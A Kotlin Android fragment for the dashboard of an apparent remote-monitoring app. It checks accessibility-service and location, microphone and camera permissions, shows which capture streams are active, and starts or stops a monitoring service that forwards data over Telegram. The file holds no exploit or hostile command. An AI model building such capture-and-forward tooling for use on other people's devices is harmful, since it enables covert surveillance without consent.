package com.example.telegramsender.ui

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import com.example.telegramsender.MonitorService
import com.example.telegramsender.R
import com.example.telegramsender.TelegramService
import com.google.android.material.button.MaterialButton
import java.text.SimpleDateFormat
import java.util.*

class DashboardFragment : Fragment() {

    private lateinit var connectionIndicator: View
    private lateinit var connectionStatusText: TextView
    private lateinit var permissionSummaryText: TextView
    private lateinit var monitoringSummaryText: TextView
    private lateinit var statusStateText: TextView
    private lateinit var mainActionButton: MaterialButton
    
    private lateinit var warningBanner: View
    private lateinit var warningText: TextView
    private lateinit var btnFixNow: MaterialButton

    private lateinit var lastScreenshotTime: TextView
    private lateinit var lastLocationTime: TextView
    private lateinit var lastAudioTime: TextView

    private lateinit var pref: SharedPreferences

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        val view = inflater.inflate(R.layout.fragment_dashboard, container, false)
        
        pref = requireContext().getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
        
        connectionIndicator = view.findViewById(R.id.connectionIndicator)
        connectionStatusText = view.findViewById(R.id.connectionStatusText)
        permissionSummaryText = view.findViewById(R.id.permissionSummaryText)
        monitoringSummaryText = view.findViewById(R.id.monitoringSummaryText)
        statusStateText = view.findViewById(R.id.statusStateText)
        mainActionButton = view.findViewById(R.id.mainActionButton)
        
        warningBanner = view.findViewById(R.id.warningBanner)
        warningText = view.findViewById(R.id.warningText)
        btnFixNow = view.findViewById(R.id.btnFixNow)

        lastScreenshotTime = view.findViewById(R.id.lastScreenshotTime)
        lastLocationTime = view.findViewById(R.id.lastLocationTime)
        lastAudioTime = view.findViewById(R.id.lastAudioTime)

        mainActionButton.setOnClickListener {
            toggleMonitoring()
        }

        return view
    }

    override fun onResume() {
        super.onResume()
        updateUI()
    }

    private fun updateUI() {
        // 0. Health Check
        performHealthCheck()

        // 1. Connection Status
        val isServiceActive = isAccessibilityServiceEnabled()
        if (isServiceActive) {
            connectionStatusText.text = "Device Connected"
            connectionIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_green)
        } else {
            connectionStatusText.text = "Device Disconnected"
            connectionIndicator.background = ContextCompat.getDrawable(requireContext(), R.drawable.circle_red)
        }

        // 2. Permission Summary
        var count = 0
        if (isAccessibilityServiceEnabled()) count++
        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) count++
        if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) count++
        if (hasPermission(android.Manifest.permission.CAMERA)) count++
        if (Build.VERSION.SDK_INT >= 33 && hasPermission(android.Manifest.permission.POST_NOTIFICATIONS)) count++ else if (Build.VERSION.SDK_INT < 33) count++
        
        permissionSummaryText.text = "Permissions: $count/5 Enabled"

        // 3. Monitoring Summary
        val activeFeatures = mutableListOf<String>()
        if (pref.getBoolean("sendScreenshot", true)) activeFeatures.add("Screens")
        if (pref.getBoolean("sendLocation", false)) activeFeatures.add("Location")
        if (pref.getBoolean("sendAudio", false)) activeFeatures.add("Audio")
        if (pref.getBoolean("sendCamera", false)) activeFeatures.add("Camera")
        monitoringSummaryText.text = "Monitoring: " + if (activeFeatures.isEmpty()) "None" else activeFeatures.joinToString(", ")

        // 4. Monitoring State
        val isMonitoring = pref.getBoolean("is_monitoring_active", false)
        if (isMonitoring) {
            statusStateText.text = "ACTIVE"
            statusStateText.setTextColor(ContextCompat.getColor(requireContext(), R.color.green_active))
            mainActionButton.text = "PAUSE MONITORING"
            mainActionButton.setBackgroundColor(ContextCompat.getColor(requireContext(), R.color.red_pause))
        } else {
            statusStateText.text = "PAUSED"
            statusStateText.setTextColor(ContextCompat.getColor(requireContext(), R.color.gray_paused))
            mainActionButton.text = "START MONITORING"
            mainActionButton.setBackgroundColor(ContextCompat.getColor(requireContext(), R.color.green_start))
        }

        // 5. Activity Feed
        updateFeedbackTime(lastScreenshotTime, "last_screenshot_sent")
        updateFeedbackTime(lastLocationTime, "last_location_sent")
        updateFeedbackTime(lastAudioTime, "last_audio_sent")
    }

    private fun updateFeedbackTime(textView: TextView, key: String) {
        val time = pref.getLong(key, 0L)
        if (time == 0L) {
            textView.text = "Never"
        } else {
            val diff = System.currentTimeMillis() - time
            textView.text = when {
                diff < 60000 -> "Just now"
                diff < 3600000 -> "${diff / 60000} min ago"
                else -> SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date(time))
            }
        }
    }

    private fun toggleMonitoring() {
        val currentState = pref.getBoolean("is_monitoring_active", false)
        val newState = !currentState
        pref.edit().putBoolean("is_monitoring_active", newState).apply()
        
        if (newState) {
            // Start services
            val monitorIntent = Intent(requireContext(), MonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                requireContext().startForegroundService(monitorIntent)
            } else {
                requireContext().startService(monitorIntent)
            }
        } else {
            // Stop MonitorService (TelegramService stays but stops loops)
            requireContext().stopService(Intent(requireContext(), MonitorService::class.java))
        }
        
        updateUI()
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(requireContext(), permission) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponentName = requireContext().packageName + "/" + TelegramService::class.java.canonicalName
        val enabledServicesSetting = Settings.Secure.getString(
            requireContext().contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedComponentName, ignoreCase = true)) return true
        }
        return false
    }

    private fun performHealthCheck() {
        val missingPermissions = mutableListOf<String>()
        if (!isAccessibilityServiceEnabled()) missingPermissions.add("Accessibility")
        if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) missingPermissions.add("Location")
        if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) missingPermissions.add("Microphone")
        if (!hasPermission(android.Manifest.permission.CAMERA)) missingPermissions.add("Camera")

        if (missingPermissions.isNotEmpty()) {
            warningBanner.visibility = View.VISIBLE
            warningText.text = "${missingPermissions.first()} permission missing"
            btnFixNow.setOnClickListener {
                val navView = requireActivity().findViewById<com.google.android.material.bottomnavigation.BottomNavigationView>(R.id.bottom_navigation)
                navView.selectedItemId = R.id.nav_permissions
            }
        } else if (pref.getString("token", "").isNullOrEmpty()) {
            warningBanner.visibility = View.VISIBLE
            warningText.text = "Telegram not connected"
            btnFixNow.setOnClickListener {
                val navView = requireActivity().findViewById<com.google.android.material.bottomnavigation.BottomNavigationView>(R.id.bottom_navigation)
                navView.selectedItemId = R.id.nav_settings
            }
        } else {
            warningBanner.visibility = View.GONE
        }
    }
}
